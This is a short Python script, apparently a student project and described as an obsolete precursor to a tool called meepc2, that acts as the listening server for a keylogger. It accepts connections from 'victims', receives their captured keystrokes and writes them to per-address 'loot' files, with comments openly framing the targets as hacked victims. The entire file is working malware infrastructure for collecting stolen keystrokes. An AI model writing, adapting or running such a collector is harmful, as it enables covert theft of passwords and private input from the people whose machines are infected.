"""
Obsolete program
Use meepc2 instead

This was the pre-cursor to meepc2
"""

import socket
import _thread


def handler(handler_socket, addr):
    # thread started by each connection
    print(addr)
    # open loot file for the ip
    with open(str(addr[0]) + ":" + str(addr[1]) + "_loot.txt", 'a+') as file:
        # test statement to see if connection is made
        # handler_socket.send(('Thanks for getting hacked, ' + str(addr) + "!").encode())
        # keep receiving keystrokes from victim
        try:
            while True:
                temp = handler_socket.recv(1024).decode()
                # test print statement for incoming keys
                print("Incoming keys from: " + str(addr) + "\n" + temp)
                if temp == "":
                    break
                file.write(str(temp))
        except handler_socket.error:
            print("\nERROR\nClosing connection to victim: " + str(addr))
            handler_socket.close()
    print("Victim disconnected: " + str(addr))
    print("Listening for victims again...")
    handler_socket.close()


def main():
    # create socket, set hostname (& convert to ip) and port
    s = socket.socket()
    hostname = "{ddns}.student.rit.edu"
    ip = socket.gethostbyname(hostname)
    # the 'meep' port
    # m = 13, e = 3 + 3 = 6, p = 16
    port = 13616

    # bind to port and listen
    s.bind((ip, port))
    s.listen(5)
    print("Listening for victims...")

    # loop listens for new victims and starts thread for each connection
    while True:
        client_socket, address = s.accept()
        print("Victim from: " + repr(address))

        _thread.start_new_thread(handler, (client_socket, address))
        print("Listening for victims in the background...")


if __name__ == '__main__':
    main()
